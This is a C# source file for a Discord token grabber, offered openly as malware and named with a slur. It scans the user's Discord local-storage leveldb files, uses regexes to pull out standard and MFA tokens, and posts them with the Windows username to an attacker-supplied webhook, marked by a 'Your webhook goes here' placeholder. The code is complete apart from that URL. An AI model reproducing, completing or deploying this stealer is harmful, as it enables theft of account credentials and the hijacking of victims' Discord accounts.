using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;

namespace retardGrabber
{
    internal class Program
    {
        private const string V = $@"{{{nameof(GetDebuggerDisplay)}(),nq}}";
        private static readonly string webhook = "here"; // Your webhook goes here
        private static bool foundSth;

        private static void Main()
        {
            var msg = GetThem();
            if (foundSth)
            {
                SendMeResults(msg);
            }
        }

        public static List<string> GetThem()
        {
            List<string> discordtokens = new();
#pragma warning disable CS8632 // Die Anmerkung für Nullable-Verweistypen darf nur in Code innerhalb eines #nullable-Anmerkungskontexts verwendet werden.
            DirectoryInfo? rootfolder = new(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
#pragma warning restore CS8632 // Die Anmerkung für Nullable-Verweistypen darf nur in Code innerhalb eines #nullable-Anmerkungskontexts verwendet werden.

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"N[\w-]{23}\.[\w-]{6}\.[\w-]{27}"))
                {
                    discordtokens.Add(match.Value + "\n");
                }
                foreach (Match match in Regex.Matches(readedfile, @"O[\w-]{23}\.[\w-]{6}\.[\w-]{27}"))
                {
                    discordtokens.Add(match.Value + "\n");
                }

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                {
                    discordtokens.Add(match.Value + "\n");
                }
            }


            discordtokens = discordtokens.ToList();

            Console.WriteLine(discordtokens);

            if (discordtokens.Count > 0)
            {
                foundSth = true;
            }
            else
            {
                discordtokens.Add("Empty");
            }

            return discordtokens;
        }

        private static void SendMeResults(List<string> message)
        {
            _ = Http.Post(webhook, new NameValueCollection()
            {
                { "username", "oops" },
                { "avatar_url", "" },
                { "content", "```\n" + "look what i got\n\n" + "Username: " + Environment.UserName + "\nTokens:\n\n" + string.Join("\n", message) + "\n```" }
            });
        }

        private static object GetDebuggerDisplay()
        {
            throw new NotImplementedException();
        }
    }
    class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
#pragma warning disable SYSLIB0014 // Typ oder Element ist veraltet
            using (WebClient webClient = new())
#pragma warning restore SYSLIB0014 // Typ oder Element ist veraltet
                return webClient.UploadValues(uri, pairs);
        }
    }
}
